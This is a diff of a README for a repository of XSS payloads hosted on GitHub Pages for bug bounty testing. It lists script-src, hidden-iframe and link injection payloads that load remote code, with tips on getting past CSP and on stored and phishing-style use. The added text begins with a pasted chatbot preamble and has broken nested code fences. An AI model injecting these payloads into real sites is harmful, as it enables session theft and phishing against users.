@@ -11,18 +11,40 @@ This repository hosts XSS payloads via GitHub Pages. It is useful for security r
 
 ---
 
-##  How to Use
+Absolutely! Here's a clean, well-formatted `README.md` section for **"How to Use"**, with proper markdown and code blocks to make it look professional and easy to read:
 
-Use This URL for XSS ---> [https://yogsec.github.io/xss-test/](https://yogsec.github.io/xss-test/)
+---
 
-Use this GitHub Pages setup to host my XSS payloads for testing real-world vulnerabilities during bug bounty hunting. When I find a vulnerable parameter or input field that allows HTML/JS injection, I inject a <script src> or <iframe> pointing to my hosted payload like
+```markdown
+## 🚀 How I Use It
 
+Use this GitHub Pages setup to host my XSS payloads for testing real-world vulnerabilities during bug bounty hunting.
+
+🔗 **Live Payload URL:**  
+[https://yogsec.github.io/xss-test/](https://yogsec.github.io/xss-test/)
+
+When I find a vulnerable parameter or input field that allows HTML/JS injection, I inject a `<script src>` or `<iframe>` pointing to my hosted payload. Here are a few ways I use it:
+
+### 📜 Basic Script Injection
+
+```html
 <script src="https://yogsec.github.io/xss-test/"></script>
+```
 
-Or, for stealthier attacks or to bypass certain restrictions, I use:
+### 🕵️‍♂️ Stealthy iframe Injection
 
+```html
 <iframe src="https://yogsec.github.io/xss-test/" style="display:none"></iframe>
+```
 
-Or
+### 🔗 Clickable Link Payload
 
+```html
 <a href="https://yogsec.github.io/xss-test/">Click Here</a>
+```
+
+This method is useful on targets where CSP policies restrict inline scripts, but allow loading scripts or frames from external sources. It’s also handy for stored XSS and phishing-style payloads.
+
+> ⚠️ Use only for ethical hacking and responsible disclosure.
+```
+
